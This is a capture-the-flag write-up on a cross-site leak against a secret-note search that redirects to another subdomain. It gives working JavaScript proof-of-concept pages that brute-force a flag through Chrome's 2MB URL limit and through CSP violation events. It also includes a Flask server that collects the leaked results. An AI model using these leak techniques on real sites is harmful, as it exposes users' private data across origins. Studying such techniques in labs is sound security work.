<hr />

<h2>description: XS leak through cross-origin redirects — intended and unintended</h2>

<h1>secrets</h1>

<h2>Overview</h2>

<blockquote>
  <p>A secure and secret note storage system is a platform or application designed to keep your confidential notes safe from unauthorized access.</p>
</blockquote>

<p>The challenge revolved around searching contents of secret notes.</p>

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-19 at 9.46.57 PM.png" alt=""><figcaption></figcaption></figure>

<p>Let's examine the behaviour of the search feature.</p>

<p>When searching for a note through <code>/search?query=&lt;query&gt;</code>, there are two possible responses:</p>

<ol>
<li>The note was found.</li>
</ol>

<p>In this case, a 301 redirect is issued to <code>http://results.wtl.pw/results?ids=&lt;note UUIDs&gt;&amp;query=&lt;query&gt;</code>.</p>

<p>```http
HTTP/1.1 301 MOVED PERMANENTLY
Server: nginx/1.23.3
Date: Sun, 19 Feb 2023 13:48:10 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 357
Connection: close
Location: http://results.wtl.pw/results?ids=92a05671-8e1a-468e-9b7f-c52789e77d4e&amp;query=test
Vary: Cookie</p>

<p><!doctype html>
<html lang=en>
<title>Redirecting...</title></p>

<h1>Redirecting...</h1>

<p>You should be redirected automatically to the target URL: <a href="http://results.wtl.pw/results?ids=92a05671-8e1a-468e-9b7f-c52789e77d4e&amp;query=test">http://results.wtl.pw/results?ids=92a05671-8e1a-468e-9b7f-c52789e77d4e&amp;query=test</a>. If not, click the link.
```

It is important to note that this is a redirect to a _different_ subdomain. Searching on **`secrets`**`.wtl.pw` redirects to **`results`**`.wtl.pw`.



<figure><img src="../../.gitbook/assets/Screenshot 2023-02-19 at 9.52.17 PM.png" alt=""><figcaption></figcaption></figure>



<ol start="2">
<li>The note was not found.</li>
</ol>

In this case, a 301 redirect is issued to `http://secrets.wtl.pw/#<query>`.

```http
HTTP/1.1 301 MOVED PERMANENTLY
Server: nginx/1.23.3
Date: Sun, 19 Feb 2023 13:51:05 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 241
Connection: close
Location: http://secrets.wtl.pw/#asdf
Vary: Cookie

<!doctype html>
<html lang=en>
<title>Redirecting...</title>


<h1>Redirecting...</h1>


<p>You should be redirected automatically to the target URL: <a href="http://secrets.wtl.pw/#asdf">http://secrets.wtl.pw/#asdf</a>. If not, click the link.

```



<figure><img src="../../.gitbook/assets/Screenshot 2023-02-19 at 9.51.58 PM.png" alt=""><figcaption></figcaption></figure>



<h2>Unintended Solution — Chrome's 2MB URL Limit</h2>

One thing that might be immediately noticeable is that if the note was found, then the resulting URL length is extended considerably by the `ids` parameter.

A [well-known technique](https://xsleaks.dev/docs/attacks/navigations/#inflation) in these kinds of scenarios is hitting the server's maximum URL limit, and detecting error status codes. However, these rely on `SameSite=None` cookies for the [error event detection](https://xsleaks.dev/docs/attacks/error-events/).&#x20;

The challenge had `SameSite=Lax` cookies, so the primitive for any XS-Leak attack is a top-level navigation (e.g. through `window.open`). There is no way to detect server response codes in a cross-origin window reference, so I started looking for other ways to detect the URL inflation.

We might not be able to detect a _server-side_ URL length error, but can we somehow detect a _client-side_ one? According to [Chromium documentation](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length), Chrome's maximum URL length is 2MB.

<blockquote>
  <p>In general, the <em>web platform</em> does not have limits on the length of URLs (although 2^31 is a common limit). <em>Chrome</em> limits URLs to a maximum length of <strong>2MB</strong> for practical reasons and to avoid causing denial-of-service problems in inter-process communication.</p>

<p></blockquote></p>

<p>This is where it gets interesting! Because this is a <em>client-side</em> constraint, and URL fragments persist on redirects, we can open <code>/search?query=&lt;query&gt;#AAA...[2MB]...AAA</code> to hit the length limit.</p>

<p>So, what happens when the URL limit is exceeded?</p>

<p>Apparently, it shows an <code>about:blank#blocked</code> page.</p>

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-19 at 10.38.58 PM.png" alt=""><figcaption></figcaption></figure>

<p>As you might expect, trying to access the <code>origin</code> (or any other sensitive information) of a cross-origin window reference would raise an exception.</p>

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-19 at 10.43.00 PM.png" alt=""><figcaption></figcaption></figure>

<p>However, when opening a page that errors out due to the 2MB constraint, the window's <code>origin</code> remains that of the parent.</p>

<p>As an experiment, let's try a successful query.</p>

<p><code>javascript
let url = "http://secrets.wtl.pw/search?query=test#"
let w = window.open(url + "A".repeat(2 * 1024 * 1024 - url.length - 1))
</code></p>

<p>The length of the opened URL&#x20;</p>

<p><code>
http://secrets.wtl.pw/search?query=test#AAA...AAA
</code></p>

<p>is exactly 2MB - 1, so the initial search URL is just under the length limit.</p>

<p>When the window is redirected to</p>

<p><code>
http://results.wtl.pw/results?ids=&lt;note UUIDs&gt;&amp;query=test#AAA...AAA
</code></p>

<p>the URL is extended and the length limit is hit. The window becomes an <code>about:blank</code> page and its <code>origin</code> remains that of the parent.</p>

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-19 at 10.54.16 PM.png" alt=""><figcaption></figcaption></figure>

<p>Now, if we try the same thing on an unsuccessful query, the final redirected URL falls short of the 2MB limit and the window's <code>origin</code> is no longer accessible.</p>

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-19 at 10.54.42 PM.png" alt=""><figcaption></figcaption></figure>

<p>This can be extended to the following PoC, which brute-forces a character of the flag.</p>

<p>```markup
<html>
<body></body></p>

<script>
    (async () => {

        const curr = "http://secrets.wtl.pw/search?query=HackTM{"

        const leak = async (char) => {

            fetch("/?try=" + char)
            let w = window.open(curr + char +  "#" + "A".repeat(2 * 1024 * 1024 - curr.length - 2))

            const check = async () => {
                try {
                    w.origin
                } catch {
                    fetch("/?nope=" + char)
                    return
                }
                setTimeout(check, 100)
            }
            check()
        }

        const CHARSET = "abcdefghijklmnopqrstuvwxyz-_0123456789"

        for (let i = 0; i < CHARSET.length; i++) {
            leak(CHARSET[i])
            await new Promise(resolve => setTimeout(resolve, 50))
        }
    })()
</script>

<p></html>
```</p>

<p>Because this PoC only tells us what is definitely <em>not</em> the flag (by detecting the <code>w.origin</code> errors), we can implement a backend server to quickly find what <em>is</em> the flag by eliminating the unsuccessful queries from the charset.</p>

<p>```python
from flask import Flask, request</p>

<p>app = Flask(<strong>name</strong>)</p>

<p>CHARSET = "abcdefghijklmnopqrstuvwxyz-_0123456789"
chars = []</p>

<p>@app.route('/', methods=['GET'])
def index():
    global chars</p>

<pre><code>nope = request.args.get('nope', '')
if nope:
    chars.append(nope)

remaining = [c for c in CHARSET if c not in chars]

print("Remaining: {}".format(remaining))

return "OK"
</code></pre>

<p>@app.route('/exploit.html', methods=['GET'])
def exploit():
    return open('exploit.html', 'r').read()</p>

<p>if <strong>name</strong> == '<strong>main</strong>':
    app.run(host='0.0.0.0', port=1337)
```</p>

<p>The downside of this method is that the long URLs can cause significant lag on the server's admin bot. This <em>may or may not</em> have made the bot extremely unstable for a period of time... oops!</p>

<h2>Intended Solution — CSP Violation</h2>

<p>It turns out that there is a much faster and less laggy way of detecting the redirects. Because the redirect is to a different origin, we can use <a href="https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects">CSP violations</a> as an oracle.&#x20;</p>

<p>```markup
<meta http-equiv="Content-Security-Policy" content="form-action http://secrets.wtl.pw"></p>

<form action="http://secrets.wtl.pw/search" method="get">
    <input type="text" name="query" value="test">
</form>

<script>
    document.addEventListener('securitypolicyviolation', () => {
        console.log("CSP violation!")
    });
    document.forms[0].submit();
</script>

<p>```</p>

<p>Because the query was successful, the window attempted to load <code>http://results.wtl.pw</code>. But since our CSP dictates that forms can only be submitted to <code>http://secrets.wtl.pw</code>, the request was blocked. We can detect this through the <code>securitypolicyviolation</code> event listener.</p>

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-19 at 11.03.59 PM.png" alt=""><figcaption></figcaption></figure>
